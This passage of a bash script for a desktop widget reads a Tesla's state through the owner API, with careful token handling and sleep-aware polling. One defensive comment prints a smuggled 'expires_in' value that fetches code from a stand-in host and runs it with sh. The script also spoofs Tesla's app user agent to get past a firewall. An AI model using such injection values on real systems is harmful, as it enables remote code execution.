#!/usr/bin/env bash
# tesla: read a Tesla, for the bar widget to call.
#
# Everything that talks to Tesla is here, so the QML never holds a credential
# and never decides on its own to touch the car.
#
# The one rule this script exists to enforce: a parked car must be allowed to
# fall asleep. Tesla's API has two very different kinds of call.
#
#   Free. Answered from Tesla's own servers, the car is not involved:
#     GET /api/1/products            the list, with each vehicle's state
#     GET /api/1/vehicles/{id}       the same summary for one vehicle
#   These report online / asleep / offline and never wake anything.
#
#   Not free. Answered by the car:
#     GET /api/1/vehicles/{id}/vehicle_data
#   On a sleeping car this returns 408 and does *not* wake it. On a car that
#   is awake it resets the sleep timer, and a car whose sleep timer is reset
#   every minute never sleeps. That is the vampire drain third-party apps are
#   famous for, and it is why `car` refuses to ask a parked car more than once
#   per --park-throttle no matter how often it is called.
#
#     POST /api/1/vehicles/{id}/wake_up
#   The only call that actually wakes a sleeping car. It runs from the `wake`
#   command and from nowhere else, so waking is always something a person did.
#
# A driving car is exempt from the throttle: it is wide awake regardless of us,
# and a moving car is the one case where a stale position is the wrong answer.

set -uo pipefail

readonly OWNER_API="https://owner-api.teslamotors.com/api/1"
readonly OWNER_API_CN="https://owner-api.vn.cloud.tesla.cn/api/1"
readonly AUTH="https://auth.tesla.com/oauth2/v3"
readonly AUTH_CN="https://auth.tesla.cn/oauth2/v3"
readonly CLIENT_ID="ownerapi"
# Tesla took https://auth.tesla.com/void/callback off the allowlist for
# client_id=ownerapi; the authorize call now 403s before the login form is even
# drawn. The app's own scheme is still accepted, at the cost of a browser that
# will not follow it, which is what makes `token` the pleasanter way in.
readonly REDIRECT="tesla://auth/callback"
readonly SCOPE="openid email offline_access"

# Tesla serves the owner API only to something that looks like its own app, and
# its login host is fussier still: auth.tesla.com sits behind a WAF that returns
# an Access Denied page, HTML rather than JSON, to a user agent naming a tool
# it does not recognise. Both hosts get these headers.
readonly APP_UA="Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0 Mobile Safari/537.36"
readonly APP_TAG="TeslaApp/4.30.6"

# Tiles and geocoding are somebody else's servers being generous, and both ask
# for a user agent that says who is calling and where to complain. Only those
# two get it; Tesla is told nothing but that this looks like a phone.
readonly MAP_UA="omarchy-tesla/1.0 (+https://github.com/jankeesvw/omarchy-tesla)"

# Force TLS 1.3 when asking for a token, and read this before removing it.
#
# Tesla's auth edge looks at the TLS handshake of the token request and records
# what it saw, encrypted, in an `x-enc` claim inside the token it hands back.
# The owner API opens that claim and refuses anything minted over TLS 1.2:
#
#   403 {"error":"forbidden, see https://developer.tesla.com/docs/fleet-api"}
#
# The token is otherwise perfect. Right audience, right scopes, unexpired, and
# it decodes to claims byte-identical to a working one except for `x-enc`. The
# error naming the Fleet API makes this look for all the world like the owner
# API has been retired, which is exactly the wrong conclusion: the same request
# with this flag returns 200.
#
# Only the token calls need it. Requests to the API itself are fine over
# whatever curl negotiates, because by then the decision has already been made.
readonly TLS_PIN="--tlsv1.3"

CONFIG_DIR="${OMARCHY_TESLA_CONFIG_DIR:-${XDG_CONFIG_HOME:-$HOME/.config}/omarchy-tesla}"
CACHE_DIR="${OMARCHY_TESLA_CACHE_DIR:-${XDG_CACHE_HOME:-$HOME/.cache}/omarchy-tesla}"

# Plugin files sit next to this script. The panel runs us by absolute path, so
# cwd is not the plugin dir.
here=$(cd "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
PLACE_JQ="$here/place.jq"
# Cache files from before country-aware formatting lack number_first.
PLACE_CACHE_USABLE='.ok == true and (.number_first | type == "boolean")'

# Seconds a parked, awake car is left alone between readings. Tesla needs
# roughly a quarter of an hour of quiet before it sleeps, so anything shorter
# than this would hold it awake forever.
PARK_THROTTLE=900
# Seconds between readings while the car is moving. It is not going to sleep
# mid-drive, so this is only about not hammering the API.
DRIVE_THROTTLE=10
# Seconds between readings while it is charging. Charging holds a car awake by
# itself, so reading it costs nothing it was not already spending, and the
# percentage is the one number worth watching climb.
CHARGE_THROTTLE=60
# Seconds between readings while something on the car is standing open. A door,
# a frunk or a boot left open is the one thing that holds a car awake by itself
# and that the panel shouts about, so the reading that says so is also the
# reading most worth replacing. Without this exception a car read at the moment
# you climbed out spends the next quarter of an hour telling you a door is open
# because the park throttle refuses to look again — the panel's loudest line,
# stuck on, every single time you park.
#
# Windows are deliberately not in this: a vented window does not hold the car
# awake, so polling for one is exactly the harm the park throttle exists to
# prevent.
OPEN_THROTTLE=60
VIN=""
TILE_URL="https://tile.openstreetmap.org/{z}/{x}/{y}.png"
FORCE=0

die() { printf 'tesla: %s\n' "$*" >&2; exit 1; }

# Every failure the widget might see comes back as JSON, so the panel can say
# what went wrong instead of going blank on a parse error.
fail_json() {
  local error="${1:-not signed in}"
  jq -cn --arg error "$error" --arg hint "${2-}" '{ok: false, error: $error, hint: $hint}'
  exit 0
}

need() { command -v "$1" >/dev/null 2>&1 || die "$1 is required but not installed"; }

need curl
need jq
need awk
need openssl
need md5sum

# Both trees are private, and not only for the tokens. The cache is a record
# of where the cars have been: cars/*.json carries each last position, and the
# geocode cache spells the coordinates out in its own filenames, so a `ls` of
# it is a movement log. On a machine with a second account, mode 755 hands
# that over for the reading. The chmod covers installs that predate this.
( umask 077; mkdir -p "$CONFIG_DIR" "$CACHE_DIR/cars" "$CACHE_DIR/tiles" "$CACHE_DIR/places" )
chmod 700 "$CONFIG_DIR" "$CACHE_DIR" "$CACHE_DIR/cars" "$CACHE_DIR/tiles" "$CACHE_DIR/places" 2>/dev/null || true

now() { date +%s; }

# Everything that reaches an arithmetic context goes through here first.
#
# Bash does not treat $(( )) as a sum over strings: it re-reads the *contents*
# of every name it finds there and evaluates those as arithmetic in turn, and
# an array subscript met along the way is a command substitution. So a token
# response answering `"expires_in": "a[$(curl evil.sh|sh)]+3600"` runs the
# command and still hands back a plausible hour, which is the part that makes
# it worth doing. Tesla's own answers are as untrusted as any other here: a
# token response is exactly what anyone able to answer for that host would
# forge.
#
# Only plain digits get through. Anything else, empty included, is not a
# duration and gets the caller's default instead. The length cap keeps the
# result inside a signed 64-bit sum and rules out the absurd; the 10# strips a
# leading zero that would otherwise be read as octal.
number_or() {
  local value="$1" fallback="$2"
  case "$value" in
    ''|*[!0-9]*) printf '%s' "$fallback"; return 0 ;;
  esac
  [ "${#value}" -le 12 ] || { printf '%s' "$fallback"; return 0; }
  printf '%s' "$((10#$value))"
}

# ------------------------------------------------------------------- fixture

# A canned reading, for working on the panel without waiting for the car to do
# something interesting. Drop a reading in $CONFIG_DIR/fixture.json and `state`
# and `car` serve that instead of asking Tesla anything at all; delete it and
# both go back to the real car. A file rather than an environment variable
# because the shell this feeds is already running, and a variable exported into
# a terminal never reaches it.
#
# The timestamp is restamped on every call, so the panel's "fetched ... ago"
# reads "just now" rather than counting up from whenever the file was written.
fixture_path() { printf '%s' "$CONFIG_DIR/fixture.json"; }

has_fixture() { [ -s "$(fixture_path)" ]; }

# The arrival time moves with the timestamp for the same reason the timestamp
# is restamped at all: a fixture written twenty minutes ago is not a car that
# arrived fifteen minutes ago, it is a car that is still four minutes out. Both
# are held where they were written, so a saved drive stays a drive.
serve_fixture() {
  jq -c --arg at "$(now)" '
    ($at|tonumber) as $now
    | (if .at == null then 0 else $now - .at end) as $shift
    | . + {at: $now, fixture: true}
    | if .eta == null then . else .eta += $shift end' "$(fixture_path)"
}

# ------------------------------------------------------------------- secrets

# Written with the same permissions every time, because these files are the
# whole of the security here: a refresh token is the account until it is
# revoked.
write_private() {
  local path="$1"
  ( umask 077; cat > "$path" )
}

# A place-cache file is usable only when it was written by place.jq.
# jq -e prints true/false; discard that or a cache hit becomes two lines.
place_cache_usable() {
  [ -s "$1" ] || return 1
  jq -e "$PLACE_CACHE_USABLE" "$1" >/dev/null 2>&1
}

read_first_line() {
  [ -r "$1" ] || return 1
  local line
  line=$(head -n1 "$1" | tr -d '\r\n')
  [ -n "$line" ] || return 1
  printf '%s' "$line"
}

# The refresh token is the credential worth having: it survives, and access
# tokens are minted from it as needed. An access token on its own is accepted
# too, so a token pasted in by hand works until it expires.
refresh_token() {
  if [ -n "${TESLA_REFRESH_TOKEN:-}" ]; then printf '%s' "$TESLA_REFRESH_TOKEN"; return 0; fi
  read_first_line "$CONFIG_DIR/refresh-token"
}

# Read only the issuer needed for regional routing. JWT claims are untrusted,
# so callers below use this solely to choose between hard-coded Tesla hosts.
jwt_issuer() {
  local token="$1" payload padding

  payload=${token#*.}
  [ "$payload" != "$token" ] || return 1
  payload=${payload%%.*}
  case "$payload" in ''|*[!A-Za-z0-9_-]*) return 1 ;; esac

  case $((${#payload} % 4)) in
    0) padding="" ;;
    2) padding="==" ;;
    3) padding="=" ;;
    *) return 1 ;;
  esac

  printf '%s%s' "$payload" "$padding" | tr '_-' '/+' \
    | openssl base64 -d -A 2>/dev/null \
    | jq -er '.iss | strings | select(length > 0)' 2>/dev/null
}

# Refresh tokens are issuer-bound. China-region accounts receive tokens from
# auth.tesla.cn, and that endpoint—not auth.tesla.com—must mint their access
# tokens.
auth_for_refresh_token() {
  local issuer
  issuer=$(jwt_issuer "$1") || issuer=""

  case "$issuer" in
    https://auth.tesla.cn/oauth2/v3) printf '%s' "$AUTH_CN" ;;
    *) printf '%s' "$AUTH" ;;
  esac
}

owner_api_for_access_token() {
  local issuer
  issuer=$(jwt_issuer "$1") || issuer=""

  case "$issuer" in
    https://auth.tesla.cn/oauth2/v3) printf '%s' "$OWNER_API_CN" ;;
    *) printf '%s' "$OWNER_API" ;;
  esac
}

# Refreshes when there is less than a minute left rather than at the moment of
# expiry: a request that starts valid can still arrive expired.
access_token() {
  if [ -n "${TESLA_ACCESS_TOKEN:-}" ]; then printf '%s' "$TESLA_ACCESS_TOKEN"; return 0; fi

  local token expires
  token=$(read_first_line "$CONFIG_DIR/access-token" 2>/dev/null) || token=""
  expires=$(read_first_line "$CONFIG_DIR/access-token-expires" 2>/dev/null) || expires=0
  expires=$(number_or "$expires" 0)

  if [ -n "$token" ] && [ "$expires" -gt "$(( $(now) + 60 ))" ]; then
    printf '%s' "$token"; return 0
  fi

  local refresh
  refresh=$(refresh_token) || return 1
  mint_access_token "$refresh"
}

# Trades the refresh token for a fresh access token and files both, because
# Tesla rotates the refresh token on some responses and dropping the new one
# means the next refresh fails.
mint_access_token() {
  local refresh="$1" auth body response token expires_in new_refresh

  [ -n "$refresh" ] || return 1
  auth=$(auth_for_refresh_token "$refresh")

  # The token reaches jq on stdin for the same reason it reaches curl there:
  # `--arg rt "$refresh"` is an argument, and arguments are public. jq only
  # lives for a few milliseconds, but that is a window rather than no window,
  # and it reopens on every refresh. `-R` makes stdin a raw line instead of
  # JSON, so `input` is the token as a string, quoted by jq exactly as --arg
  # would have.
  body=$(printf '%s\n' "$refresh" | jq -cRn --arg id "$CLIENT_ID" --arg scope "$SCOPE" \
    '{grant_type: "refresh_token", client_id: $id, refresh_token: input, scope: $scope}')

  # Same reasoning as `api`, and more of it: this body carries the refresh
  # token, which is the account until it is revoked. It goes in on stdin.
  response=$(printf '%s' "$body" | curl -sS $TLS_PIN -m 30 -X POST "$auth/token" \
    -H "Content-Type: application/json" \
    -H "User-Agent: $APP_UA" -H "X-Tesla-User-Agent: $APP_TAG" \
    --data-binary @- 2>/dev/null) || return 1

  # The WAF answers in HTML when it objects, so this has to survive being
  # handed something that is not JSON at all.
  token=$(printf '%s' "$response" | jq -r '.access_token // empty' 2>/dev/null)
  [ -n "$token" ] || return 1

  expires_in=$(number_or "$(printf '%s' "$response" | jq -r '.expires_in // empty' 2>/dev/null)" 28800)
  new_refresh=$(printf '%s' "$response" | jq -r '.refresh_token // empty' 2>/dev/null)

  printf '%s\n' "$token" | write_private "$CONFIG_DIR/access-token"
  printf '%s\n' "$(( $(now) + expires_in ))" | write_private "$CONFIG_DIR/access-token-expires"
  [ -n "$new_refresh" ] && printf '%s\n' "$new_refresh" | write_private "$CONFIG_DIR/refresh-token"

  printf '%s' "$token"
}

base64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }

# Tesla's login is a browser affair: a password, probably a second factor, and
# whatever bot check it feels like today. So the browser does the logging in
# and hands back a code through the address bar, which is what PKCE is for:
# no client secret has to live in a script anybody can read.
cmd_login() {
  local verifier challenge state url redirect code

  verifier=$(openssl rand 64 | base64url)
  challenge=$(printf '%s' "$verifier" | openssl dgst -sha256 -binary | base64url)
  state=$(openssl rand 16 | base64url)

  url="$AUTH/authorize?client_id=$CLIENT_ID&code_challenge=$challenge&code_challenge_method=S256&redirect_uri=$(printf '%s' "$REDIRECT" | jq -sRr @uri)&response_type=code&scope=$(printf '%s' "$SCOPE" | jq -sRr @uri)&state=$state"

  cat <<EOF

Sign in to Tesla in a browser, with the account the car is on.

  $url

Tesla will send you to an address starting with $REDIRECT.
Your browser cannot follow that, so it will refuse, or offer to open an app,
and the address you need may never appear in the address bar. Open the
developer tools on the Network tab before you sign in, and read the Location
header off the last redirect.

If that sounds like more trouble than it is worth, it is: press Ctrl-C and use
`tesla token` with a refresh token from one of the apps in the README instead.

EOF

  command -v xdg-open >/dev/null 2>&1 && xdg-open "$url" >/dev/null 2>&1 &

  printf 'Address: '
  read -r redirect

  code=$(printf '%s' "$redirect" | sed -n 's/.*[?&]code=\([^&]*\).*/\1/p')
  [ -n "$code" ] || die "no code in that address. Paste the whole thing, including the ?code=... part"

  local body response refresh
  # Both of these are credentials — together they buy the refresh token — and
  # both went in as arguments. On stdin instead, a line each, read as a pair so
  # nothing depends on the order jq happens to evaluate an object in. Neither
  # can carry a newline: the code is cut out of a single line of input and the
  # verifier is base64url.
  body=$(printf '%s\n%s\n' "$code" "$verifier" \
    | jq -cRn --arg id "$CLIENT_ID" --arg redirect "$REDIRECT" \
    '[inputs] as $in
     | {grant_type: "authorization_code", client_id: $id,
        code: $in[0], code_verifier: $in[1], redirect_uri: $redirect}')

  response=$(printf '%s' "$body" | curl -sS $TLS_PIN -m 30 -X POST "$AUTH/token" \
    -H "Content-Type: application/json" \
    -H "User-Agent: $APP_UA" -H "X-Tesla-User-Agent: $APP_TAG" --data-binary @-)

  refresh=$(printf '%s' "$response" | jq -r '.refresh_token // empty' 2>/dev/null)
  [ -n "$refresh" ] || die "Tesla did not hand over a refresh token: $(printf '%s' "$response" | jq -r '.error_description // .error // .' 2>/dev/null)"

  printf '%s\n' "$refresh" | write_private "$CONFIG_DIR/refresh-token"
  printf '%s\n' "$(printf '%s' "$response" | jq -r '.access_token')" | write_private "$CONFIG_DIR/access-token"
  printf '%s\n' "$(( $(now) + $(number_or "$(printf '%s' "$response" | jq -r '.expires_in // empty' 2>/dev/null)" 28800) ))" | write_private "$CONFIG_DIR/access-token-expires"

  printf '\nSigned in. The token is in %s and nothing else needs doing.\n' "$CONFIG_DIR/refresh-token"
}

# The pleasant way in. Every token app hands you a refresh token; this takes
# one, proves it works by spending it on an access token, and files both. No
# browser, no developer tools, no custom URL scheme.
cmd_token() {
  local refresh access

  if [ -t 0 ]; then
    printf 'Paste the refresh token: '
    read -r refresh
  else
    refresh=$(head -n1)
  fi

  refresh=$(printf '%s' "$refresh" | tr -d " \t\r\n\"")
  [ -n "$refresh" ] || die "nothing pasted"

  # Filed first, because mint_access_token is what reads it, and checked second
  # by whether that worked. A token that cannot buy an access token is not a
  # token worth keeping.
  printf '%s\n' "$refresh" | write_private "$CONFIG_DIR/refresh-token"
  rm -f "$CONFIG_DIR/access-token" "$CONFIG_DIR/access-token-expires"

  access=$(mint_access_token "$refresh") || {
    rm -f "$CONFIG_DIR/refresh-token"
    die "Tesla would not accept that token. Check you pasted the refresh token rather than the access token."
  }

  [ -n "$access" ] || die "Tesla would not accept that token"
  printf 'Signed in. The token is in %s and nothing else needs doing.\n' "$CONFIG_DIR/refresh-token"
}

cmd_logout() {
  rm -f "$CONFIG_DIR/refresh-token" "$CONFIG_DIR/access-token" "$CONFIG_DIR/access-token-expires"
  printf 'Signed out. Tesla still lists the app under Security in your account; revoke it there to be thorough.\n'
}

# ----------------------------------------------------------------- transport

# Where `api` leaves Tesla's complaint, when it made one.
#
# A file and not a variable, which looks like overkill until you notice that
# every caller writes `$(api ...)`. Command substitution runs the function in a
# subshell, and a global assigned in a subshell is thrown away with it, so the
# obvious version of this silently reported success on every error.
readonly API_ERROR_FILE="$CACHE_DIR/.last-error"

api_error() { cat "$API_ERROR_FILE" 2>/dev/null; }

api() {
  local path="$1" method="${2:-GET}" payload="${3-}" token owner_api body body_file
  : > "$API_ERROR_FILE"

  token=$(access_token) || { printf 'not signed in' > "$API_ERROR_FILE"; return 2; }
  owner_api=$(owner_api_for_access_token "$token")

  # A quote or a backslash would end the --config line early and turn the rest
  # of the token into curl options. Tesla's tokens are base64url and contain
  # neither, so anything that does is not a token worth sending.
  case "$token" in
    *[\"\\]*|*[[:space:]]*) printf 'malformed token' > "$API_ERROR_FILE"; return 2 ;;
  esac

  # The bearer token goes in on stdin, not in the arguments. /proc/PID/cmdline
  # is mode 444 on a stock kernel — no hidepid — so every argument of every
  # running process is readable by any account on the machine, and a widget
  # that polls hands out a fresh window to catch it in on a loop. curl reads
  # `header` lines from --config the same as -H, and stdin is nobody else's
  # to read.
  # A request body cannot ride on stdin: stdin is already carrying the bearer
  # token, and that is the one thing here worth keeping off the command line.
  # So the body goes to a file only this account can read, and curl is pointed
  # at it. The file is removed the moment curl is done with it.
  if [ -n "$payload" ]; then
    body_file="$CACHE_DIR/request.$$.json"
    printf '%s' "$payload" | write_private "$body_file"
  fi

  body=$(printf 'header = "Authorization: Bearer %s"\n' "$token" \
    | curl -sS -m 30 -X "$method" --config - \
    -H "User-Agent: $APP_UA" \
    -H "X-Tesla-User-Agent: $APP_TAG" \
    -H "Accept: application/json" \
    ${payload:+-H "Content-Type: application/json"} \
    ${payload:+--data-binary "@$body_file"} \
    "$owner_api/$path" 2>/dev/null) \
    || { rm -f "${body_file:-}"; printf 'cannot reach Tesla' > "$API_ERROR_FILE"; return 1; }

  [ -n "${body_file:-}" ] && rm -f "$body_file"

  # Tesla says no in JSON, so an error body still parses and still has to be
  # noticed. Reading past it is how a widget ends up cheerfully reporting a
  # cached "online" about a car it has lost access to.
  local complaint
  complaint=$(printf '%s' "$body" | jq -r '.error // empty' 2>/dev/null)
  case "$complaint" in
    "") ;;
    *fleet-api*|*fleetapi*) printf 'owner API retired for this account' > "$API_ERROR_FILE" ;;
    *) printf '%s' "$complaint" > "$API_ERROR_FILE" ;;
  esac

  printf '%s' "$body"
}

# The one hint worth spelling out, because it is the end of the road for this
# widget rather than something to retry.
api_hint() {
  case "$(api_error)" in
    "owner API retired"*) printf '%s' "Tesla has moved this account to the Fleet API, which this widget does not speak" ;;
    "not signed in") printf '%s' "run: tesla login" ;;
    *) printf '' ;;
  esac
}

# ------------------------------------------------------------------ vehicles

# The vehicle list is cached because it changes when you buy a car, and asking
# for it is a round trip the bar would otherwise make every time it polls.
# `/api/1/vehicles` is the obvious endpoint and Tesla has retired it for owner
# tokens; `/api/1/products` still answers and carries the same fields.
vehicle_list_json() {
  local cache="$CACHE_DIR/vehicles.json" age response vehicles

  if [ -r "$cache" ]; then
    age=$(( $(now) - $(stat -c %Y "$cache" 2>/dev/null || echo 0) ))
    [ "$age" -lt 86400 ] && cat "$cache" && return 0
  fi

  response=$(api products) || return 2
  [ -z "$(api_error)" ] || return 3
  vehicles=$(printf '%s' "$response" | jq -c '[.response[]? | select(.vin != null)]')
  [ "$(printf '%s' "$vehicles" | jq -r 'length')" -gt 0 ] || return 1
  printf '%s' "$vehicles" | write_private "$cache"
  printf '%s' "$vehicles"
}

vehicle_json() {
  local vehicles picked
  vehicles=$(vehicle_list_json) || return $?
  picked=$(printf '%s' "$vehicles" | jq -c --arg vin "$VIN" '
    if $vin == "" then .[0] else (map(select(.vin == $vin)) | .[0]) end
    // empty')

  [ -n "$picked" ] || return 1
  printf '%s' "$picked"
}

vehicle_error() {
  local error
  error=$(api_error)
  if [ -n "$error" ]; then printf '%s' "$error"; else printf '%s' "car not found"; fi
}

vehicle_hint() {
  local hint
  hint=$(api_hint)
  if [ -n "$hint" ]; then printf '%s' "$hint"; else printf '%s' "check that the VIN belongs to this account"; fi
}

# The state poll. This is the one the bar runs on a timer, and it must stay
# free: it reads Tesla's copy of the car's state, not the car.
cmd_state() {
  if has_fixture; then
    jq -c --arg at "$(now)" '{ok: true, at: ($at|tonumber), fixture: true,
                               state: (.state // "online"), id: "fixture",
                               vin: (.vin // "FIXTURE"), name: (.name // "Tesla"),
                               vehicles: [{vin: (.vin // "FIXTURE"),
                                           name: (.name // "Tesla")}]} ' "$(fixture_path)"
    return 0
  fi

  local vehicles vehicle
  vehicles=$(vehicle_list_json) || fail_json "$(vehicle_error)" "$(vehicle_hint)"
  vehicle=$(vehicle_json) || fail_json "$(vehicle_error)" "$(vehicle_hint)"

  local id state
  id=$(printf '%s' "$vehicle" | jq -r '.id_s // (.id|tostring)')

  # Straight from the summary rather than the cached copy, so a car that woke
  # up since the list was cached is reported awake.
  state=$(api "vehicles/$id" | jq -r '.response.state // empty' 2>/dev/null)
  [ -z "$(api_error)" ] || fail_json "$(api_error)" "$(api_hint)"
  [ -n "$state" ] || state=$(printf '%s' "$vehicle" | jq -r '.state // "unknown"')

  # Which command protocol this car is on, so the panel can stop offering the
  # four things the signed one has no equivalent for rather than offering
  # buttons that can only ever come back with an apology.
  local signed=false
  signed_mode && signed=true

  jq -cn --argjson v "$vehicle" --argjson vehicles "$vehicles" \
    --argjson signed "$signed" \
    --arg state "$state" --arg at "$(now)" '
    {ok: true, state: $state, at: ($at|tonumber), signed: $signed,
      id: ($v.id_s // ($v.id|tostring)), vin: $v.vin,
      name: (if ($v.display_name // "") == "" then "Tesla" else $v.display_name end),
      vehicles: ($vehicles | map({
        vin: .vin,
        name: (if (.display_name // "") == "" then "Tesla" else .display_name end)
      }))}'
}

# ------------------------------------------------------------------ readings

# Tesla reports miles and mph on the wire whatever the car shows on its own
# screen, and reports which of the two the screen shows in gui_settings. The
# panel follows the dashboard: a number here that disagrees with the one in
# the car is worse than no number.
reading_json() {
  local raw="$1" state="$2" fresh="$3"
  printf '%s' "$raw" | jq -c --arg state "$state" --argjson fresh "$fresh" --arg at "$(now)" '
    . as $r
    | ($r.gui_settings.gui_distance_units // "km/hr") as $units
    | (if ($units | startswith("mi")) then 1 else 1.609344 end) as $k
    | (if ($units | startswith("mi")) then "mi" else "km" end) as $dist
    | (if ($units | startswith("mi")) then "mph" else "km/h" end) as $speed
    | (if ($r.gui_settings.gui_range_display // "Rated") == "Ideal"
       then $r.charge_state.ideal_battery_range else $r.charge_state.battery_range end) as $range
    # Tesla reports Celsius and bar on the wire and states the screen'"'"'s own
    # preference separately, the same as it does for distance. Convert once,
    # here, so nothing downstream has to know which car this is.
    | (($r.gui_settings.gui_temperature_units // "C") == "F") as $fahrenheit
    | (if $fahrenheit then 1.8 else 1 end) as $tc
    | (if $fahrenheit then 32 else 0 end) as $to
    | (if $fahrenheit then "°F" else "°C" end) as $tunit
    | (($r.gui_settings.gui_tirepressure_units // "Bar") | ascii_downcase == "psi") as $psi
    | (if $psi then 14.5038 else 1 end) as $pc
    | (if $psi then "psi" else "bar" end) as $punit
    | ([$r.vehicle_state.tpms_pressure_fl, $r.vehicle_state.tpms_pressure_fr,
        $r.vehicle_state.tpms_pressure_rl, $r.vehicle_state.tpms_pressure_rr]
       | map(select(. != null and . > 0) * $pc)) as $tpms
    # Grouped rather than listed one by one: "a door" is what you act on, and
    # which of the four it is you find out by walking up to the car.
    | ([(if (($r.vehicle_state.df // 0) + ($r.vehicle_state.dr // 0)
            + ($r.vehicle_state.pf // 0) + ($r.vehicle_state.pr // 0)) != 0
         then "a door" else empty end),
        (if ($r.vehicle_state.ft // 0) != 0 then "the frunk" else empty end),
        (if ($r.vehicle_state.rt // 0) != 0 then "the boot" else empty end),
        (if (($r.vehicle_state.fd_window // 0) + ($r.vehicle_state.fp_window // 0)
            + ($r.vehicle_state.rd_window // 0) + ($r.vehicle_state.rp_window // 0)) != 0
         then "a window" else empty end)]) as $open
    | {ok: true,
       fresh: $fresh,
       state: $state,
       at: ($at|tonumber),
       name: (if ($r.vehicle_state.vehicle_name // "") == "" then "Tesla" else $r.vehicle_state.vehicle_name end),
       vin: $r.vin,
       lat: $r.drive_state.latitude,
       lon: $r.drive_state.longitude,
       heading: $r.drive_state.heading,
       gps_as_of: $r.drive_state.gps_as_of,
       shift: ($r.drive_state.shift_state // "P"),
       driving: (($r.drive_state.shift_state // "P") != "P" and ($r.drive_state.shift_state // null) != null),
       speed: (if $r.drive_state.speed == null then null else ($r.drive_state.speed * $k | round) end),
       speed_unit: $speed,
       # Where it is going, when navigation is running. Absent the rest of the
       # time, and absent is the answer: a car with no route set has no
       # destination to name. The arrival time is worked out here rather than
       # in the panel, because the panel would be adding "six minutes" to the
       # clock on the wall while the reading it came from was already a minute
       # old, and an eta that drifts later every time you look at it is worse
       # than none. Distance comes over the wire in miles whatever the car is
       # set to, the same as everything else, so it converts like the rest.
       destination: (($r.drive_state.active_route_destination // "")
                     | if . == "" then null else . end),
       eta: (if $r.drive_state.active_route_minutes_to_arrival == null then null
             else (($at|tonumber)
                   + ($r.drive_state.active_route_minutes_to_arrival * 60) | round) end),
       eta_distance: (if $r.drive_state.active_route_miles_to_arrival == null then null
                      else ($r.drive_state.active_route_miles_to_arrival * $k * 10 | round / 10) end),
       # A delay under a minute is not a delay, it is rounding.
       eta_delay: (($r.drive_state.active_route_traffic_minutes_delay // 0)
                   | if . < 1 then null else round end),
       battery: $r.charge_state.battery_level,
       battery_usable: $r.charge_state.usable_battery_level,
       charge_limit: $r.charge_state.charge_limit_soc,
       charging: ($r.charge_state.charging_state // "Unknown"),
       # Whether there is a cable in it at all. "Disconnected" is the only
       # value that means no; everything else — Charging, Stopped, Complete,
       # NoPower — is a car with something plugged into it, and that is what
       # decides whether a start-charging button has anything to do.
       plugged_in: (($r.charge_state.charging_state // "Disconnected") != "Disconnected"),
       charge_port_open: $r.charge_state.charge_port_door_open,
       charge_amps: ($r.charge_state.charge_current_request // $r.charge_state.charge_amps),
       charge_amps_max: $r.charge_state.charge_current_request_max,
       charger_power: $r.charge_state.charger_power,
       energy_added: $r.charge_state.charge_energy_added,
       minutes_to_full: $r.charge_state.minutes_to_full_charge,
       range: (if $range == null then null else ($range * $k * 10 | round / 10) end),
       range_unit: $dist,
       odometer: (if $r.vehicle_state.odometer == null then null else ($r.vehicle_state.odometer * $k | round) end),
       locked: $r.vehicle_state.locked,
       sentry: $r.vehicle_state.sentry_mode,
       valet: $r.vehicle_state.valet_mode,
       # Whether a window is off its seal at all, as a yes or no. The `open`
       # list above says the same thing in words, for the sentence under the
       # map; a control needs a boolean it can light up.
       windows_open: ((($r.vehicle_state.fd_window // 0) + ($r.vehicle_state.fp_window // 0)
                     + ($r.vehicle_state.rd_window // 0) + ($r.vehicle_state.rp_window // 0)) != 0),
       climate_on: $r.climate_state.is_climate_on,
       # The setpoint twice: Celsius because that is what `set_temps` takes and
       # what the plus and minus buttons do their arithmetic in, and the
       # display number because that is what goes on screen. Rounding the
       # display one hides the half-degree a Fahrenheit car lands on when its
       # Celsius setpoint is converted back.
       climate_setpoint_c: $r.climate_state.driver_temp_setting,
       climate_setpoint: (if $r.climate_state.driver_temp_setting == null then null
                          else ($r.climate_state.driver_temp_setting * $tc + $to | round) end),
       # Tesla reports max defrost as a mode rather than a switch: 0 is off and
       # 2 is on. Nothing else has ever come back, and anything that did would
       # not be off.
       defrost: (($r.climate_state.defrost_mode // 0) != 0),
       # Tesla cannot make its mind up what this field is. Some firmware
       # answers the integer the set command takes, some answers a word, and
       # the panel needs one of them. The integer wins, because it is what
       # goes back over the wire, and the word is translated to it here rather
       # than leaving every reader to guess.
       climate_keeper: (($r.climate_state.climate_keeper_mode // 0)
                        | if type == "string"
                          then ({"off": 0, "on": 1, "keep": 1, "dog": 2, "camp": 3}[.] // 0)
                          else . end),
       wheel_heater: $r.climate_state.steering_wheel_heater,
       # Named seats rather than the numbering Tesla uses, which has a hole at 3.
       # Absent seats come back null and the panel leaves them out, so a car
       # without rear heaters does not grow five dead controls.
       seats: {"front-left": $r.climate_state.seat_heater_left,
               "front-right": $r.climate_state.seat_heater_right,
               "rear-left": $r.climate_state.seat_heater_rear_left,
               "rear-center": $r.climate_state.seat_heater_rear_center,
               "rear-right": $r.climate_state.seat_heater_rear_right},
       inside_temp: (if $r.climate_state.inside_temp == null then null
                     else ($r.climate_state.inside_temp * $tc + $to | round) end),
       outside_temp: (if $r.climate_state.outside_temp == null then null
                      else ($r.climate_state.outside_temp * $tc + $to | round) end),
       temp_unit: $tunit,
       tyres: ($tpms | if length == 0 then null else {min: (min * 10 | round / 10),
                                                     max: (max * 10 | round / 10)} end),
       tyre_unit: $punit,
       software: $r.vehicle_state.car_version,
       open: $open,
       car_type: $r.vehicle_config.car_type,
       trim: $r.vehicle_config.trim_badging}'
}

# Everything the panel shows, and the whole of the sleep policy.
#
# The order matters. State first, because it is free and it decides whether
# asking the car is even possible. Then the throttle, because a parked car
# that answered ten minutes ago has not moved and does not need asking again.
# Only then the expensive call.
car_cache_path() {
  local vehicle="$1" vin key
  vin=$(printf '%s' "$vehicle" | jq -r '.vin // empty')
  key=$(printf '%s' "$vin" | md5sum | awk '{print $1}')
  printf '%s/cars/%s.json' "$CACHE_DIR" "$key"
}

read_car_cache() {
  local vehicle="$1" cache legacy="$CACHE_DIR/car.json" vin legacy_vin
  cache=$(car_cache_path "$vehicle")
  if [ -r "$cache" ]; then cat "$cache"; return 0; fi

  # Keep the last reading from pre-multi-car installs, but only for the VIN it
  # actually belongs to, until a fresh reading replaces it in the new cache.
  [ -r "$legacy" ] || return 1
